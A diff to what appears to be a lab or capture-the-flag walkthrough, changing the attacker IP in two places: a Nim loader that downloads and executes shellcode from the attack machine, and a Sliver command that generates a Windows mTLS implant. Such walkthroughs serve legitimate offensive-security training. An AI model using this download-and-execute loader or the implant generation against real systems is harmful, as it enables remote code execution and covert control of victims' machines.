@@ -90,7 +90,7 @@ proc DownloadExecute(url: string): void =
 
 when defined(windows):
   when isMainModule:
-    DownloadExecute("http://10.10.17.184/shellc.bin")
+    DownloadExecute("http://10.10.14.213/shellc.bin")
 ```
 
 - Make sure that that the ip matches our tun0 attack machine
@@ -106,7 +106,7 @@ nim c -d:mingw --os:windows --cpu:amd64 --cc:gcc --gcc.exe:x86_64-w64-mingw32-gc
 
 #### Now, inside sliver
 ```python
-generate --mtls 10.10.17.184:9001 --os windows --arch amd64 --format shellcode --save shellc.bin
+generate --mtls 10.10.14.213:9033 --os windows --arch amd64 --format shellcode --save shellc.bin
 ```
 - We've successfully generated the implant
 ##### Setting up sliver listener
